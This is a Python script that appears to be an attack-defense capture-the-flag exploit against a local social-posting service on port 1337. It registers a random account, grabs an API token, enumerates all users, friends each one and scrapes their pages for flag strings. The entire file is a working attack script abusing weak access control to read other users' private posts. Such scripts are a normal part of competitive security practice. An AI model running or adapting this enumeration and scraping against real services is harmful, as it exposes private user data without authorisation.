#!/usr/bin/env python3

import sys
import requests
import hashlib
import re
from random import choice


alph_full = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alph_caps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
names = ['goliath', 'royal', 'dacota', 'marry', 'hunter', 'twilight' ,'smile' ,'castle', 'lucky', 'Wilson', 'Johanna', 'Willow', 'Wigfrid', 'Wendy', 'Wolfgang', 'Wes', 'Webber', 'Woody']
FlagRegExp = re.compile(r'[A-Za-z0-9]{31}=')

#ip = sys.argv[1]
ip = '127.0.0.1'
port = '1337'
host = f'{ip}:{port}'


def id_gen( size = 10, first = names, next = alph_full ):
	beg = choice(first)
	return  beg + ''.join(choice(next) for i in range(size - len(beg)))


def main():

	flags = ''

	u_name = id_gen(next=alph_caps)
	passwd = id_gen(first=alph_full)
		
	sess, csrf = register( u_name, passwd )

	token = get_token( sess )

	for user in users( sess, token ):

		add_to_friend( sess, user )

		for flag in view_bark( sess, user ):
			flags += flag + '\n'

	print( flags, flush=True )


def get_token( s ) -> str:
		#http://127.0.0.1:1337/generate_token/ | GET
		html = s.get( f'http://{host}/generate_token/' ).text
		return re.findall( r"<h5>(\w{32})</h5>", html )[0]
	

def register( u_name, passwd ):
	#name="csrfmiddlewaretoken" value="gV...7"
	s = requests.session()
	html = s.get(f'http://{host}/signup/').text
	csrf = re.findall( 'name="csrfmiddlewaretoken" value="(\w+)"', html )

	#http://127.0.0.1:1337/signup/ | POST | csrfmiddlewaretoken=8...O&username=1&password=1&fname=&lname=
	html = s.post(f'http://{host}/signup/', data={
		'csrfmiddlewaretoken':csrf, 
		'username':u_name, 
		'password':passwd, 
		'fname':'', 
		'lname':''
	}).text
	csrf = re.findall( 'name="csrfmiddlewaretoken" value="(\w+)"', html )
	return s, csrf


def users( s, token ) -> list:
	#http://127.0.0.1:1337/users/<int:page_n>/
	html = ''
	for _ in range( 18 ):
		
		html += s.get( f'http://{host}/api/users/{_}/', headers={"Token":token} ).text

	return re.findall('"username": "(\w+)"' , html)


def add_bark( s, csrf, u_name ):
	#http://127.0.0.1:1337/add_bark/ | POST | csrfmiddlewaretoken=ZD...8os&bark_text=message&is_private=on
	data = {'csrfmiddlewaretoken':csrf, 'bark_text':u_name,'is_private':'on'}
	html = s.post( f'http://{host}/add_bark/', data=data ).text
	return re.findall(f'"/get_bark/(\d+)/">{u_name}<', html)[0]


def add_to_friend( s, username ):
	#http://127.0.0.1:1337/add_friend/dacota7A4E/
	s.get( f'http://{host}/add_friend/{username}/' )


def view_bark( s, u_name ) -> list:
	#http://127.0.0.1:1337/get_bark/35/ | GET
	html = s.get( f'http://{host}/{u_name}/' ).text
	return re.findall( FlagRegExp, html )


if __name__ == '__main__':
	main()